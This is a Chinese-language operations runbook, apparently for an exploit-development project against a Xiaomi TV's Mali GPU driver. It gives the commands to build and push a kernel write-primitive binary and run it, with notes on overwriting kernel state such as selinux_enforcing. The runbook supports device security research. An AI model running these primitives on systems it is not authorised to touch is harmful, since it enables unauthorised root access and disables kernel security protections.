# 04 · 复现与操作手册

> 目的：让下一个人（或下一次会话）**不用重新踩坑**就能把环境跑起来、把证据采到、把实验做完。

## 1. 环境变量模板（每次开新会话先跑）

```powershell
$ws   = "$env:USERPROFILE\Documents\deepseek-harness\default-workspace"
$adb  = "$ws\tools\platform-tools\adb.exe"
$zig  = "$ws\tools\zig\zig.exe"
$py   = "C:\Users\22856\AppData\Local\Programs\Python\Python313\python.exe"   # 系统 python（有 pyelftools/capstone/androguard）

# 关键：adb 与 zig 的临时目录都必须重定向，否则权限拒绝
$env:TEMP = "$ws\tools\tmp"; $env:TMP = "$ws\tools\tmp"
$env:ZIG_GLOBAL_CACHE_DIR = "$ws\tools\zig-cache"
$env:ZIG_LOCAL_CACHE_DIR  = "$ws\tools\zig-cache"
New-Item -ItemType Directory -Force -Path $env:TEMP,$env:ZIG_GLOBAL_CACHE_DIR | Out-Null
```

### adb 起不来的坑（必看）

现象：

```
F adb: main.cpp:54 cannot open C:\Users\22856\AppData\Local\Temp\adb.log: Permission denied
could not read ok from ADB Server
* failed to start daemon
```

原因：默认 `%TEMP%` 下的 `adb.log` 打不开（该文件/目录对 adb 进程表现为权限拒绝；删掉文件也没用）。
**解法：把 `TEMP`/`TMP` 指到工作区目录再启动 adb**（如上一节），之后 `adb start-server` 正常。本次已实测有效。

## 2. 连接电视

```powershell
& $adb kill-server
& $adb start-server
& $adb connect 192.168.2.105:5555
& $adb devices -l
```

期望：`192.168.2.105:5555    device`

### 当前设备状态（2026-11-10 15:2x 检查）

| 检查项 | 结果 |
|---|---|
| `ping 192.168.2.105` | ✅ 通（1~70ms） |
| TCP 5555 | ✅ 开放 |
| `adb connect` | ❌ `failed to connect`，随后设备显示 **`offline`** |
| 本机 adb key | `%USERPROFILE%\.android\adbkey` 存在（2026-11-09 22:15 生成，即上次成功连接用的那把） |

**判断**：网络与 adbd 端口都活着，但 adb 传输层握手没通过。最常见两种原因：
1. 电视端弹出了「允许 USB 调试吗？」而屏幕没人确认（待机/黑屏状态下更容易发生）；
2. adbd 侧状态异常（重启电视或 `adb kill-server` 后重连通常能好）。

**建议动作**：① 用遥控器唤醒电视，看是否有授权弹窗；② 电视断电重启一次再 `adb connect`；③ 若仍 offline，可在电视的开发者选项里「撤销 USB 调试授权」后重新授权。

## 3. 采集证据

```powershell
# 设备指纹
& $adb shell "getprop ro.product.device; getprop ro.build.version.incremental; getprop ro.build.display.id; getprop ro.build.date; uname -a; id"

# 内核日志（含崩溃转储，最有价值）
& $adb shell dmesg > "$ws\dmesg_$(Get-Date -f HHmmss).txt"

# kallsyms 符号序（注意：地址全 0，只有名字+顺序）
& $adb shell cat /proc/kallsyms > "$ws\device_kallsyms.txt"
& $adb shell "wc -l /proc/kallsyms"      # 应为 91624

# 崩溃转储检索（GP/PP 失败时）
& $adb shell dmesg | Select-String -Pattern "Executor|Job|mali" -Context 0,30
```

> `device_kallsyms.txt` 目前是 **0 字节**（上次采集失败），下次连上设备第一件事就是重拉。

## 4. 编译与推送

```powershell
Push-Location "$ws\mitv4-utgard-lpe-main"
& $zig cc -target arm-linux-musleabihf -O1 -static -o gpu_arb_write src/gpu_arb_write.c
& $zig cc -target aarch64-linux-musl   -O1 -static -o kfunc        src/kfunc.c
& $zig cc -target arm-linux-musleabihf -O1 -static -o pp_read      src/pp_read.c
& $zig cc -target aarch64-linux-musl   -O1 -static -o gp_read      src/gp_read.c
Pop-Location

& $adb push "$ws\mitv4-utgard-lpe-main\gpu_arb_write" /data/local/tmp/
& $adb shell chmod 755 /data/local/tmp/gpu_arb_write
```

注意事项：
- `gpu_arb_write` 是 **armv7**（32 位），`kfunc`/`gp_read` 是 **aarch64**（64 位静态）——这台机器用户态是 32 位，但**64 位静态程序可以执行**（已实测）。
- zig 首次运行需 `Unblock-File`（Mark-of-the-Web），且 `TMP`/缓存目录必须显式指定，否则 `AccessDenied`。
- 编译后**核对二进制里有没有 `calibration only` 字符串**，避免推上去的是旧产物：

```powershell
Select-String -Path "$ws\mitv4-utgard-lpe-main\gpu_arb_write" -Pattern "calibration only" -Encoding Byte -SimpleMatch
# 或 python: b"calibration only" in open(path,'rb').read()
```

## 5. 运行写原语

```powershell
# ① 先跑校准（phys=0 只校准，不写目标；当前二进制已含该模式）
& $adb shell /data/local/tmp/gpu_arb_write 0 0
# 期望：[*] calibration: request 0x800 -> changed [0x800..0x87f], 128 bytes  OK

# ② 校准通过后，才写「已验证过的」物理地址
& $adb shell /data/local/tmp/gpu_arb_write <phys_hex> <value_hex>
```

语义提醒：
- 写的是 **128 字节**（同一个 8 字节值重复 16 次），起点精确、无 4/8 字节粒度；
- 对**热变量**（`selinux_enforcing` 之类）GPU 写**不生效**，必须走 CPU 侧写（把槽指向 `memcpy`）；
- 每次真实写之前先想清楚：写错 = panic + 重启（无损但中断现场）。

## 6. 固件候选包的 2 分钟判定

```powershell
$py "$ws\scan_bin.py"      # 扫 eMMC BIN 里的 'ANDROID!' 魔数
$py "$ws\extract_boot.py"  # 解析 bootimg：确认 kernel_addr=0x1080000、切出 kernel
$py "$ws\decomp_kernel.py" # gunzip + 打印版本串
```

判定标准（三条全中才算同一构建）：

1. 版本串含 `3.14.29-g4f3e19b`；
2. 构建时间含 `Mon Aug 20 16:52:56 CST 2018`；
3. `vmlinux-to-elf` 重建后符号数 = **91624**（与设备 `/proc/kallsyms` 行数一致）。

参考管线（上次对 AZ dump 跑通过的）：

```
UnRAR → BIN → 'ANDROID!' → bootimg(kernel_addr=0x1080000) → gunzip → Image → vmlinux-to-elf(基址 0xffffffc001080000)
```

## 7. 事故复盘（唯一一次重启）

- **发生了什么**：第一版二进制还没有「仅校准」模式时，执行 `gpu_arb_write 0 0`，向**物理地址 0** 写了 128 字节 → 内核 panic → watchdog 重启。
- **代价**：约 4 分钟不可用，系统无损（`panic_on_oops=1` 下必然 panic，但文件系统未损坏）。
- **已修的机制**：`phys == 0` 时只跑校准并打印 `calibration only - not writing the requested address`，然后退出。
- **教训**：哑参数（0、0xffffffff 之类）永远不要直接进真实写路径。

## 8. 故障排查表

| 现象 | 原因 | 处理 |
|---|---|---|
| `adb start-server` 报 `cannot open ... adb.log: Permission denied` | `%TEMP%` 权限问题 | 重定向 `TEMP`/`TMP` 到 `$ws\tools\tmp` |
| `adb connect` 后 `offline` | 电视端未授权 / adbd 异常 | 唤醒电视看弹窗；电视重启；撤销授权后重连 |
| `zig cc` 报 `AccessDenied` | MOTW 或缓存/临时目录 | `Unblock-File`；设 `ZIG_*_CACHE_DIR` 与 `TMP` |
| `python` 报 `No module named 'elftools'` | 用了 DSH 自带 python | 改用系统 python（见 §1） |
| 脚本名 `dis.py` 报 capstone 循环导入 | 文件名与标准库 `dis` 冲突 | 改名（如 `disas_fill.py`） |
| `gpu_arb_write` 输出 `bind cmd buffer: Bad address` | dma_buf 绑定 flags 缺 `0x200` | 已修；确认推的是新版二进制 |
| PP job 立即 `UNKNOWN_ERR` | cmd 缓冲全零 / 缺 `0xBC000000` 终止束 / `user[328]` 未置 1 | 见 [02 §C](02-技术事实.md) |
| GP job 超时且无输出 | 信号量命令在只跑 VS 时挂起 | 见 [02 §F](02-技术事实.md) |
